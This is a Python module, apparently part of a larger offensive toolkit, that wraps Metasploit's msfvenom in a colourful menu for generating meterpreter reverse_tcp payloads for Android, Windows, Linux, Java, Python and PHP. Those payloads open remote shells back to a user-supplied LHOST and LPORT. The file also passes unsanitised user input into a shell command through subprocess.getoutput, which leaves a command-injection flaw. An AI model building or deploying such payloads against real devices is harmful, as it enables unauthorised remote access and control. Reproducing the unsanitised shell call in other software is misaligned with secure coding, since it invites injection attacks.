import subprocess
from colorama import Fore, Style

class MsfvenomModule:
    def __init__(self):
        self.payloads = {
            "1": {"payload": "android/meterpreter/reverse_tcp", "description": "Android Payload"},
            "2": {"payload": "windows/meterpreter/reverse_tcp", "description": "Windows Payload"},
            "3": {"payload": "linux/x86/meterpreter/reverse_tcp", "description": "Linux x86 Payload"},
            "4": {"payload": "linux/x64/meterpreter/reverse_tcp", "description": "Linux x64 Payload"},
            "5": {"payload": "java/meterpreter/reverse_tcp", "description": "Java Payload"},
            "6": {"payload": "python/meterpreter/reverse_tcp", "description": "Python Payload"},
            "7": {"payload": "php/meterpreter/reverse_tcp", "description": "PHP Payload"}
        }

    def display_payload_options(self):
        print(Fore.CYAN + "\n 🧪 Payload Options 🧪" + Style.RESET_ALL)
        for key, payload in self.payloads.items():
            print(f"{Fore.MAGENTA}{key}. {payload['description']}{Style.RESET_ALL}")

    def generate_payload(self, payload, lhost, lport, output_file):
        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_file}"
        print(Fore.YELLOW + "🚀 Generating payload..." + Style.RESET_ALL)
        result = subprocess.getoutput(command)
        print(result)
        
        input("Press any key to return to the main menu...")

    def run(self):
        while True:
            self.display_payload_options()
            print(Fore.RED + "b. Go Back" + Style.RESET_ALL)
            
            choice = input("🔢 Select an option: ")
            if choice == 'b':
                break
            
            if choice in self.payloads:
                payload = self.payloads[choice]["payload"]
                lhost = input("🌐 Enter LHOST: ")
                lport = input("🚪 Enter LPORT: ")
                output_file = input("📁 Enter the output file name: ")
                self.generate_payload(payload, lhost, lport, output_file)
            else:
                print(Fore.RED + "Invalid option." + Style.RESET_ALL)
